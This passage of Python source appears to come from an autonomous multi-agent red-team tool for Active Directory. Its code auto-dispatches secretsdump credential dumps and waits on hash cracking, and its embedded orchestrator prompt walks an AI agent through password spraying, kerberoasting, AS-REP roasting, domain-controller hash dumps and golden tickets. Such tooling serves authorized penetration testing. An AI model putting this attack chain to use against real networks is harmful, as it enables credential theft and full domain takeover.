                if not matching_cred:
                    logger.debug(
                        f"Auto-secretsdump: Found {vuln.vuln_type} for {admin_user} on {target_ip} "
                        f"but no matching password credential"
                    )
                    continue

                key = (target_ip, admin_user.lower(), admin_domain.lower())

                if key in secretsdump_attempts or failed_attempts.get(key, 0) >= max_retries:
                    continue

                logger.warning(
                    f"🔓 Auto-secretsdump: BloodHound {vuln.vuln_type} detected - "
                    f"{admin_domain}\\{admin_user} has admin on {target_ip}, dispatching secretsdump"
                )

                task_id = await dispatcher.request_credential_access(
                    source_agent="orchestrator",
                    domain=admin_domain or (state.target.domain if state.target else ""),
                    target_ips=[target_ip],
                    username=matching_cred.username,
                    password=matching_cred.password,
                    reason=f"auto_bloodhound_{vuln.vuln_type}",
                    techniques=["secretsdump"],
                )

                if task_id:
                    secretsdump_attempts[key] = task_id
                    # Mark vulnerability as exploited to avoid re-processing
                    state.mark_exploited(vuln_id)
                    logger.info(
                        f"Auto-secretsdump task {task_id} dispatched for BloodHound {vuln.vuln_type}"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto local admin secretsdump error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
    """Get task IDs for crack tasks that are still pending (running)."""
    crack_task_ids = []
    for task_id, task_info in dispatcher.shared_state.pending_tasks.items():
        if task_info.task_type == "crack":
            crack_task_ids.append(task_id)
    return crack_task_ids


async def _wait_for_crack_tasks(
    dispatcher: RedTeamDispatcher,
    timeout: float = CRACK_TASK_GRACE_PERIOD,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for running crack tasks to complete with a timeout.

    Args:
        dispatcher: The dispatcher instance
        timeout: Maximum seconds to wait for crack tasks
        check_interval: Seconds between checks
    """
    start_time = asyncio.get_event_loop().time()
    crack_tasks = _get_running_crack_tasks(dispatcher)

    if not crack_tasks:
        return

    logger.info(
        f"Waiting for {len(crack_tasks)} running crack task(s) to complete "
        f"(grace period: {timeout}s)"
    )

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout:
            remaining = _get_running_crack_tasks(dispatcher)
            if remaining:
                logger.warning(
                    f"Crack task grace period expired with {len(remaining)} task(s) "
                    f"still running: {remaining}"
                )
            break

        remaining = _get_running_crack_tasks(dispatcher)
        if not remaining:
            logger.success("All crack tasks completed within grace period")
            break

        logger.debug(
            f"Waiting for {len(remaining)} crack task(s): {remaining} "
            f"({elapsed:.0f}s/{timeout:.0f}s elapsed)"
        )
        await asyncio.sleep(check_interval)


async def _wait_for_completion(
    dispatcher: RedTeamDispatcher,
    background_tasks: list[asyncio.Task],
    max_runtime: float = 7200.0,
    check_interval: float = 10.0,
) -> None:
    """
    Wait for operation completion or domain admin achievement.

    Args:
        dispatcher: The dispatcher instance
        background_tasks: Background tasks to monitor
        max_runtime: Maximum runtime in seconds
        check_interval: Seconds between completion checks
    """
    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        # Check runtime limit
        if elapsed > max_runtime:
            logger.warning(f"Operation reached max runtime ({max_runtime}s)")
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break

        # Check for domain admin or explicit completion
        if dispatcher.shared_state.has_domain_admin:
            logger.success("Domain Admin achieved! Operation complete.")
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break
        if dispatcher.shared_state.completed:
            logger.success("Operation marked complete.")
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break

        # Check for failed background tasks
        for task in background_tasks:
            if task.done() and not task.cancelled():
                exc = task.exception()
                if exc:
                    logger.error(f"Background task {task.get_name()} failed: {exc}")

        await asyncio.sleep(check_interval)


def _build_orchestrator_prompt(
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None = None,
) -> str:
    """
    Build the initial prompt for the orchestrator agent.

    Args:
        target_domain: Target domain
        target_ips: Target IPs
        initial_credential: Initial credential if available

    Returns:
        Formatted prompt string
    """
    cred_info = "None (start with unauthenticated recon)"
    if initial_credential:
        cred_info = f"{initial_credential.domain}\\{initial_credential.username}"

    return f"""Begin red team operation for {target_domain}.

Target IPs: {", ".join(target_ips)}
Initial credential: {cred_info}

Your objectives:
1. Run nmap_scan on all targets to discover services (ONCE - do NOT re-scan targets that have already been scanned)
2. **Run smb_sweep on all targets** - This captures Windows OS versions, FQDNs, and domain membership (CRITICAL for host identification)
3. **MULTI-DOMAIN SETUP (run early with first credential!):**
   - enumerate_domain_netbios_mappings: Query AD for NetBIOS->FQDN domain mappings
   - This ensures credentials from child domains resolve correctly (e.g., CORP -> corp.contoso.local)
4. LOW-HANGING FRUIT (do these early!):
   - ldap_search_descriptions: Find passwords stored in user description fields
   - password_spray with common passwords (Password1, Welcome1, Summer2024, Company123, Qwerty123, Passw0rd!, LetMeIn1)
   - username_as_password: Test if users have username as password (e.g., user1:user1)
5. Enumerate users and shares with netexec/enum4linux-ng/rpcclient/smbclient
6. If no creds, run Kerberos user recon with kerberos_user_enum_noauth
7. Run certipy_find to discover ADCS vulnerabilities
8. Run run_bloodhound for ACL analysis and attack path discovery
9. **CRITICAL CREDENTIAL EXPANSION (run IMMEDIATELY after finding ANY credentials):**
   - Use secretsdump on ALL domain controllers to dump hashes
   - Use kerberoast to find service accounts with weak passwords
   - Use asrep_roast to find accounts without Kerberos pre-auth
   - Check secretsdump output for krbtgt or Administrator hashes
   - If krbtgt hash found → Generate golden ticket → Announce Domain Admin
   - If Administrator hash found → Test DA access → Announce Domain Admin
10. Coordinate with specialized agents to exploit discovered vulnerabilities
11. Use trigger_credential_expansion after getting new credentials
12. Continue until Domain Admin access achieved

Priority vulnerabilities to look for:
- Passwords in LDAP description fields (QUICK WIN - check first!)
- Username=password combinations (QUICK WIN)
- Weak/common passwords via spraying (QUICK WIN)
- **krbtgt hash via secretsdump (HIGHEST PRIORITY - instant DA)**
- **Administrator hash via secretsdump (VERY HIGH PRIORITY)**
- ADCS ESC1-ESC8
- Kerberoastable accounts
- AS-REP roastable accounts
- Unconstrained/Constrained delegation
- ACL abuse paths (GenericAll, WriteDACL, etc.)
- MSSQL linked servers

CRITICAL WORKFLOW AFTER FINDING CREDENTIALS:
1. Run secretsdump against all DCs immediately
2. Run kerberoast and asrep_roast with the credentials
3. Look for krbtgt or Administrator in secretsdump output
4. Crack any discovered hashes with dispatch_crack_hash
5. Test new credentials and repeat steps 1-4

Remember:
- Use dispatch_* tools to route tasks to specialized agents
- Use queue_vulnerability_for_exploitation to queue discovered vulnerabilities
- Use trigger_credential_expansion after finding new credentials
- **ALWAYS run secretsdump after finding ANY credentials**
- Monitor progress with get_operation_summary
- Announce domain admin when achieved with announce_domain_admin

IMPORTANT - Avoid polling loops:
- Do NOT repeatedly call get_pending_tasks or get_exploitation_status without taking action
- If tasks are pending, wait for results OR dispatch new tasks - don't just keep checking status
- Only check status after taking an action or after significant time has passed
- Each step should make progress (dispatch task, exploit vuln, expand creds) - not just observe

Let's begin the operation!
"""


__all__ = [
    "run_multi_agent_operation",
]
